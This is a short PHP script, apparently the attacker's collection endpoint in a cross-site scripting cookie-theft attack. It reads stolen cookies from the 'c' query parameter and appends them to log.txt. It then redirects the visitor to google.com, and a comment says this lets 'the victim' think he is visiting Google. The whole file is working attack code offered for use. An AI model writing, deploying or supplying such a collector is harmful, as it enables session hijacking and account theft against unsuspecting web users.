<?php

header ('Location:https://google.com');//;et the victim think as he is visiting the google.com
$cookies = $_GET["c"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");



?>
